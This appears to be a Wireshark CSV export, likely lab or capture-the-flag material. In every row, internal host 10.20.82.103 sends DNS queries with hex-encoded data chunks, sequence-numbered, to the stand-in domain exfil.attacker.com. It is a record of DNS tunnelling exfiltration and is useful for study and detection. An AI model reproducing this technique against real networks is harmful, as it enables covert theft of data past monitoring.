"No.","Time","Source","Destination","Protocol","Length","Info"
"629","0.257503","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f7e37a56138a88b6a8b85b5ed49f59c45c55b5c7a3eda42d5e.628.exfil.attacker.com"
"630","0.257998","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e37cceb483181c631bd57d5f3978becb993c11f260d947e48a.629.exfil.attacker.com"
"631","0.258398","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 99eb3253a4b932a08e0a762dcedcbfdc2f22eee88fa36b73f4.630.exfil.attacker.com"
"632","0.258713","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 78474693a118afe2ef2207f5e35fe4a36739206fab8fd8565c.631.exfil.attacker.com"
"633","0.259040","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a7d87edf6662bbb3397374cc4773c25dfa89758e6837d11ee3.632.exfil.attacker.com"
"634","0.259577","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A bac6f1f6d732ce3ffe2cfa62fc7eee532de7cf5ea72b46e34e.633.exfil.attacker.com"
"635","0.259905","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 44fc5d1c471c633f4799edefcf54f39eb3f9e991515e88f39a.634.exfil.attacker.com"
"636","0.260375","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A b9c6b9e87d64fe93556dfa4a7b1eddbf10f728ae67bbce773f.635.exfil.attacker.com"
"637","0.260733","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 44ba43d5bfce16e0db3d8cdf3f731daa226d8beaa1e9b7abfa.636.exfil.attacker.com"
"638","0.261112","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 4d5f5858e9ae5cf089fd6d34d63f8b51dea9e6cd11f1e7fdf1.637.exfil.attacker.com"
"639","0.261428","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e6f94f6cef6c9b6d05aebccfa3ebc3acdae6b318cd19ab7bdf.638.exfil.attacker.com"
"640","0.261756","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7e3ecf4b668f396febaefef0697ea20074a51813bf7736b144.639.exfil.attacker.com"
"641","0.262103","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a7cc93c0d98886fc6ca23e327ac57314338b826cd409abc478.640.exfil.attacker.com"
"642","0.262453","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 469590cf24b5389e38d616716daac55f15f173711f22e146c4.641.exfil.attacker.com"
"643","0.262765","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 20d06f2b47249b9c9c73447b8801f8ccb9cce8cfb76a079124.642.exfil.attacker.com"
"644","0.263184","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f371b7b84bd5ff8eb6b7dc97e2ffb77bd316637dc4b9b7856a.643.exfil.attacker.com"
"645","0.263507","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A de771f470bbb9f28ce37ce25ce33aec5ccb58ddfa916a92d8e.644.exfil.attacker.com"
"646","0.263829","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2e544713e888e8475754eda7459efccccadb893833316d05b4.645.exfil.attacker.com"
"647","0.264138","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 518c9e0ac635c93fdbe2485f6cf7fe591c299ccee6c788b8fe.646.exfil.attacker.com"
"648","0.264501","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 47af5bb4d1bc9d8823eded15a21fc5fd18b5bdd98836303b11.647.exfil.attacker.com"
"649","0.264871","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 5da55ae43d8a236352dcefdc665b8cf6db8a5f555cb936d583.648.exfil.attacker.com"
"650","0.265193","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a2b6bff8bb2a17e6057ffcec913e57a9daf4ecf5acccb4b957.649.exfil.attacker.com"
"651","0.265499","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 16148f6ae3ef2846e34eb49ffcb32d46f2b58f6bd70ad5711c.650.exfil.attacker.com"
"652","0.265845","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 796ed0cfd346c711f1689fdfac9a9f9e2dbebd2b17e47b1e71.651.exfil.attacker.com"
"653","0.266191","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a51facea6fa37c348a47e71bfbca3f9fa32a76c79fb7639d99.652.exfil.attacker.com"
"654","0.266510","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 1bc5cfc4cf8eaec195b56813fbc8db7d14a3e24f9899f3441b.653.exfil.attacker.com"
"655","0.266907","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9f39f726fffed539ebb7f8890250c80bc867d11653571ddd6f.654.exfil.attacker.com"
"656","0.267569","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 34dcab9391480879bb555c39c7aab810b14ade6e1ceb194716.655.exfil.attacker.com"
"657","0.267989","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 3377461c475ceb9cac57cbfb9d8d68a377caede58c1884aac9.656.exfil.attacker.com"
"658","0.268308","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cb9958d1cf3e499e6cc5fd8c73ccf1ac3fc4c07b66b08f765d.657.exfil.attacker.com"
"659","0.268660","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e5b95505b6dc7eda391e19e49b517e3cd31eaae3ba1a8f263f.658.exfil.attacker.com"
"660","0.268986","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d9b3c9502bf81e91dbd228ceb695d1c4f693c57946fe8e6b13.659.exfil.attacker.com"
"661","0.269299","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A fd6834598efe157f1fe7186d6345db3f63b65d1ecd83a3be73.660.exfil.attacker.com"
"662","0.269621","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 25ce8eed4d1cffa371a1e5c22af7550ba833729bbe7a4ef938.661.exfil.attacker.com"
"663","0.269927","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f3f9c4fecef4bd57a9aef5d57874bed106467df2689ccd6bdf.662.exfil.attacker.com"
"664","0.270296","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a2ba37d19e8e7a672ef8e4fef6e86158bfcd67797794d3e277.663.exfil.attacker.com"
"665","0.270701","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 1fb5d118a7f25c2ccf035be46de7df79768c475445bb2a9e3d.664.exfil.attacker.com"
"666","0.271023","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 50caf7be8ff6e6f351793b11bfe037cef2ff3c5b40b68e75a6.665.exfil.attacker.com"
"667","0.271333","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 013d1289f2515288e41513cb51873ee3d124be1523aea83ae1.666.exfil.attacker.com"
"668","0.271662","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d524dc5493d7b34f2872227c55443b8b7b1ed779e57d7de4d9.667.exfil.attacker.com"
"669","0.271999","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 62f051c4f1deadf5bdabd5f558f447fb3e3ae16bfdec4cd1e0.668.exfil.attacker.com"
"670","0.272359","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 1b3c5b088da2bda1707521d4f7dbe877cf06f2a3fa9c166de8.669.exfil.attacker.com"
"671","0.272774","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 6cbf1af59333db3bfac46f268e4cc6ab73b97a3fe33a8cf2e6.670.exfil.attacker.com"
"672","0.273129","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A b3c9e78ceaada857e49f5f532df4fa3672669e73f449ee4cac.671.exfil.attacker.com"
"673","0.273433","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A baf7713ed136476db7c58a369ce5361db9ea8aea98dff126d9.672.exfil.attacker.com"
"674","0.273742","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 59cfeec19998d1deee3abaffe82ba337c67693cf3de24cbb7a.673.exfil.attacker.com"
"675","0.274095","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 672ef8f4fe166d69d406678bce792e77645c8f76fc68cd398a.674.exfil.attacker.com"
"676","0.274413","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A bbfbc1a3426d9cefccdc3caf3d571c733e96885ff01b679944.675.exfil.attacker.com"
"677","0.274807","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 23eb5f5d8c4e35d3f0ae8a8e1b1d20f6d93e4e74a5d13e13e7.676.exfil.attacker.com"
"678","0.275147","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 154923a29de7aafd55c96536793f933b78c49145d151edbe54.677.exfil.attacker.com"
"679","0.275512","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 11d7acb5931cf177f9e76792f3af6a1386b3c5bc4ab4e7d6a7.678.exfil.attacker.com"
"680","0.275865","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 4671773ffb34d106db2bf8ed8d858896075adbbd23e7c536ef.679.exfil.attacker.com"
"681","0.276159","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A ec076dfb578c9e447dabbe9daf12fda5b59df6b18c95dbe77e.680.exfil.attacker.com"
"682","0.276486","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d107639ed11e46c43d7ce75b49afd4c6857efc8effbe23e7dd.681.exfil.attacker.com"
"683","0.276812","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a1cd4fdb1c83e3e25e3ffa285a9b83ff427f68a25fe4712fe2.682.exfil.attacker.com"
"684","0.277221","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d7dbd85dfdad6f7fb3c59ba6fdeed5e3e9e7c76d2e1891fbc1.683.exfil.attacker.com"
"685","0.277650","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2b45dfecf77f647ede7e77e55896fbc337cf078ff88db364b9.684.exfil.attacker.com"
"686","0.278117","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 5c9d8eb85a856faa6d4767e7fbc57d7cf56003bd983ce4fc72.685.exfil.attacker.com"
"687","0.278418","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f5ad3400f86431f7ca635fc4aa85347ca3dc1f227ec16f9c25.686.exfil.attacker.com"
"688","0.278762","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cb55aff1c5c26a85bcdd08450360853bdf5e04804fb4dbdbaf.687.exfil.attacker.com"
"689","0.279079","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 70d5e8adb85ff01b67c972b9b344ac28d2fc726704ee57bd61.688.exfil.attacker.com"
"690","0.279522","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A b8aa780d009fa87afbd5c30f7ed9e8adb85ff01b67c952a30e.689.exfil.attacker.com"
"691","0.279863","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 73e4739c23a36d03ac90734bc4d92f7b04806f503dfc883762.690.exfil.attacker.com"
"692","0.280188","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e15755ffe8d0afac397fe32c59aaea30f18df72b784515b84b.691.exfil.attacker.com"
"693","0.280533","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7cd741ce2d11dff2e5b0007046f52f03aefed73ae19bfcf25b.692.exfil.attacker.com"
"694","0.280868","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7156d61c766787a9b61d017095370c01f84579dc8b58f1d50d.693.exfil.attacker.com"
"695","0.281190","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f0ade25fc7cd7d62d57af6d399f97258d561567d8786021070.694.exfil.attacker.com"
"696","0.281494","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9778da9973cbaf0cf600fca678cb358f7de6d6fcba3bff41a3.695.exfil.attacker.com"
"697","0.281824","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 4fa7f77358d561563d45500002ee52fd0b60bf32d803f09baa.696.exfil.attacker.com"
"698","0.282192","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A af57f0f0835f36fa4a805ff94e482b6b0ecb9d65d5f7ff0405.697.exfil.attacker.com"
"699","0.282664","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 20e02ed59760fafe1f007656cdad7dff0fbfac2a8a46acf807.698.exfil.attacker.com"
"700","0.282991","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 8dbe8195358754dfa1b1f25f11a806a90880ab725e89b71901.699.exfil.attacker.com"
"701","0.283291","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 6067d5c38f5f59e842a57a23fc97e68456d61c521568e25f05.700.exfil.attacker.com"
"702","0.283613","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 5ba5fa17c622567dc40cf84d55f1faaf7ffd6bfe3100d84a1e.701.exfil.attacker.com"
"703","0.283983","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A fbe25f04835f151fff8a4fafe47ef14b734205200ec94f1156.702.exfil.attacker.com"
"704","0.284314","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 574bab455ac4af7c2693ef136d33fac5bbe29706ac2baae2b5.703.exfil.attacker.com"
"705","0.284701","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 27a0c00e624113ff40471e1f5e193e4efbff8bb1395fa35746.704.exfil.attacker.com"
"706","0.285261","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9b3757f36a736a7ed9e8e35fbf94c3148098567d61d61d9f21.705.exfil.attacker.com"
"707","0.285609","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cefb88b0c8e553554f115e1d2bdfc2db553cf1ecaf592c9600.706.exfil.attacker.com"
"708","0.285894","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7650fd0b87af0e6f95fcc3e85fdd7a75c4bc3de6cffd9fadfc.707.exfil.attacker.com"
"709","0.286149","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A de4ef846d53f66f46bf94b018869f9e359d181627059adfa67.708.exfil.attacker.com"
"710","0.286418","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e657bf6904ab5403c9abe3979e5a9c5115af5d336017a327da.709.exfil.attacker.com"
"711","0.287386","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A af0c45f57f88b74bf3f57975b4424f7ef871c7835bf816a35c.710.exfil.attacker.com"
"712","0.287707","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A f96b6fc52900312d1766eeea2ca3cee97b80f8445148888f17.711.exfil.attacker.com"
"713","0.288142","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A bd2bbcfdf35c7e3abef28beb013e41e4b93c3ebc32ee7820f8.712.exfil.attacker.com"
"714","0.288494","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cd626cced7e895117393fc269287a9fcb2d177ffc447267f8d.713.exfil.attacker.com"
"715","0.288787","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 021053f2d38c3b3b8b0e0aacd4bfa515b9c5420580dde57fe9.714.exfil.attacker.com"
"716","0.289037","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A c883547e59ac23f3da32e217df085700e2efc59d785a104f8f.715.exfil.attacker.com"
"717","0.289297","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 460ba3f8fbd651eefae8572f3fb16fe1d555a0893cd49e7a8f.716.exfil.attacker.com"
"718","0.289550","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A bed0397f01e62f0ef400ec25de968fb16f54d4c90f53cd9ff9.717.exfil.attacker.com"
"719","0.289827","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 65b918dae2ae4fb37c3a05a01f178ba67e8088e24e5e20f5af.718.exfil.attacker.com"
"720","0.290133","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 90c6cfe6bfbfcba8521b031e40ffdd06919bf2401e13e0feed.719.exfil.attacker.com"
"721","0.290449","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9ffcf700f06df2173b57ff504affb50d3ef6ccaf8a756efe1e.720.exfil.attacker.com"
"722","0.290764","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2cfd4201e8e7e5a7e36d21157f1e8ba75830b5025174a05715.721.exfil.attacker.com"
"723","0.291026","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7f42ec7fd4696351d79e7c54f1cae304de23e78588f69433be.722.exfil.attacker.com"
"724","0.291284","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 7fa1e58fc861be2b09801d540f4863311bf3e698fff6c51f0f.723.exfil.attacker.com"
"725","0.291691","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 4dd9551477f2faaf45ac5ff377d75673c55fa500f4e3f22ba2.724.exfil.attacker.com"
"726","0.292087","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a388a70b777fecab12fb1cbdb6f72c80bd5593e01cf133a38f.725.exfil.attacker.com"
"727","0.292426","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 8701c0b7e9bf966114f1a074f4f130d8c1cc1c3047fc8e9704.726.exfil.attacker.com"
"728","0.292740","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 1480f8bf8f785555d2787afee8bb355e298e310a41b3ffe4b6.727.exfil.attacker.com"
"729","0.293041","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2f8c86fdb502712e62479e883f37c803b0a3989fe739718c85.728.exfil.attacker.com"
"730","0.293358","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 319ff7c62bbf20b7ff51b439a182e83f2800010000006c4e01.729.exfil.attacker.com"
"731","0.293815","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0800000060730a40000000009b5300e2ade23b3afccb5d00cf.730.exfil.attacker.com"
"732","0.294276","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e57ff10200be553f9e7dc2f78dc2af500002000000d89c0210.731.exfil.attacker.com"
"733","0.294655","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000c0e614800000000036a70004000000b0390520000000.732.exfil.attacker.com"
"734","0.295012","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 80cd2900010000006c4e010800000060730a40000000009b53.733.exfil.attacker.com"
"735","0.295351","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0002000000d89c0210000000c0e614800000000036a7000400.734.exfil.attacker.com"
"736","0.295717","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000b039052000000080cd2900010000006c4e010800000060.735.exfil.attacker.com"
"737","0.296034","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 730a40000000009b530002000000d89c0210000000c0e61480.736.exfil.attacker.com"
"738","0.296343","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000000036a70004000000b039052000000080cd2900010000.737.exfil.attacker.com"
"739","0.296726","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 006c4e010800000060730a40000000009b530002000000d89c.738.exfil.attacker.com"
"740","0.297096","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0210000000c0e614800000000036a70004000000b039052000.739.exfil.attacker.com"
"741","0.297403","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000080cd2900010000006c4e010800000060730a4000000000.740.exfil.attacker.com"
"742","0.297793","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9b530002000000d89c0210000000c0e614800000000036a700.741.exfil.attacker.com"
"743","0.298143","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 04000000b039052000000080cd2900010000006c4e01080000.742.exfil.attacker.com"
"744","0.298458","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0060730a40000000009b530002000000d89c0210000000c0e6.743.exfil.attacker.com"
"745","0.298768","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 14800000000036a70004000000b039052000000080cd290001.744.exfil.attacker.com"
"746","0.299095","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000006c4e010800000060730a40000000009b530002000000.745.exfil.attacker.com"
"747","0.299832","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d89c0210000000c0e614800000000036a70004000000b03905.746.exfil.attacker.com"
"748","0.300259","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2000000080cd2900010000006c4e010800000060730a400000.747.exfil.attacker.com"
"749","0.300577","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00009b530002000000d89c0210000000c0e614800000000036.748.exfil.attacker.com"
"750","0.300959","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a70004000000b039052000000080cd2900010000006c4e0108.749.exfil.attacker.com"
"751","0.301282","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000060730a40000000009b530002000000d89c0210000000.750.exfil.attacker.com"
"752","0.301695","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A c0e614800000000036a70004000000b039052000000080cd29.751.exfil.attacker.com"
"753","0.302137","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00010000006c4e010800000060730a40000000009b53000200.752.exfil.attacker.com"
"754","0.302487","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000d89c0210000000c0e614800000000036a70004000000b0.753.exfil.attacker.com"
"755","0.302785","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 39052000000080cd2900010000006c4e010800000060730a40.754.exfil.attacker.com"
"756","0.303084","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000009b530002000000d89c0210000000c0e61480000000.755.exfil.attacker.com"
"757","0.303441","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0036a70004000000b039052000000080cd2900010000006c4e.756.exfil.attacker.com"
"758","0.303830","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 010800000060730a40000000009b530002000000d89c021000.757.exfil.attacker.com"
"759","0.304196","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000c0e614800000000036a70004000000b039052000000080.758.exfil.attacker.com"
"760","0.304576","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cd2900010000006c4e010800000060730a40000000009b5300.759.exfil.attacker.com"
"761","0.304887","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 02000000d89c0210000000c0e614800000000036a700040000.760.exfil.attacker.com"
"762","0.305201","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00b039052000000080cd2900010000006c4e01080000006073.761.exfil.attacker.com"
"763","0.305537","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0a40000000009b530002000000d89c0210000000c0e6148000.762.exfil.attacker.com"
"764","0.305852","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000036a70004000000b039052000000080cd290001000000.763.exfil.attacker.com"
"765","0.306145","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 6c4e010800000060730a40000000009b530002000000d89c02.764.exfil.attacker.com"
"766","0.306528","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 10000000c0e614800000000036a70004000000b03905200000.765.exfil.attacker.com"
"767","0.306889","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0080cd2900010000006c4e010800000060730a40000000009b.766.exfil.attacker.com"
"768","0.307192","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 530002000000d89c0210000000c0e614800000000036a70004.767.exfil.attacker.com"
"769","0.307539","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000b039052000000080cd2900010000006c4e0108000000.768.exfil.attacker.com"
"770","0.307853","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 60730a40000000009b530002000000d89c0210000000c0e614.769.exfil.attacker.com"
"771","0.308161","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 800000000036a70004000000b039052000000080cd29000100.770.exfil.attacker.com"
"772","0.308529","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00006c4e010800000060730a40000000009b530002000000d8.771.exfil.attacker.com"
"773","0.308877","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9c0210000000c0e614800000000036a70004000000b0390520.772.exfil.attacker.com"
"774","0.309194","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000080cd2900010000006c4e010800000060730a40000000.773.exfil.attacker.com"
"775","0.309489","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 009b530002000000d89c0210000000c0e614800000000036a7.774.exfil.attacker.com"
"776","0.309837","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0004000000b039052000000080cd2900010000006c4e010800.775.exfil.attacker.com"
"777","0.310148","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000060730a40000000009b530002000000d89c0210000000c0.776.exfil.attacker.com"
"778","0.310491","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e614800000000036a70004000000b039052000000080cd2900.777.exfil.attacker.com"
"779","0.310795","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 010000006c4e010800000060730a40000000009b5300020000.778.exfil.attacker.com"
"780","0.311217","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00d89c0210000000c0e614800000000036a70004000000b039.779.exfil.attacker.com"
"781","0.311555","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 052000000080cd2900010000006c4e010800000060730a4000.780.exfil.attacker.com"
"782","0.312076","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000009b530002000000d89c0210000000c0e6148000000000.781.exfil.attacker.com"
"783","0.312620","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 36a70004000000b039052000000080cd2900010000006c4e01.782.exfil.attacker.com"
"784","0.312952","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0800000060730a40000000009b530002000000d89c02100000.783.exfil.attacker.com"
"785","0.313279","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00c0e614800000000036a70004000000b039052000000080cd.784.exfil.attacker.com"
"786","0.313610","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2900010000006c4e010800000060730a40000000009b530002.785.exfil.attacker.com"
"787","0.313959","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000d89c0210000000c0e614800000000036a70004000000.786.exfil.attacker.com"
"788","0.314312","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A b039052000000080cd2900010000006c4e010800000060730a.787.exfil.attacker.com"
"789","0.314774","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 40000000009b530002000000d89c0210000000c0e614800000.788.exfil.attacker.com"
"790","0.315099","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000036a70004000000b039052000000080cd2900010000006c.789.exfil.attacker.com"
"791","0.315449","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 4e010800000060730a40000000009b530002000000d89c0210.790.exfil.attacker.com"
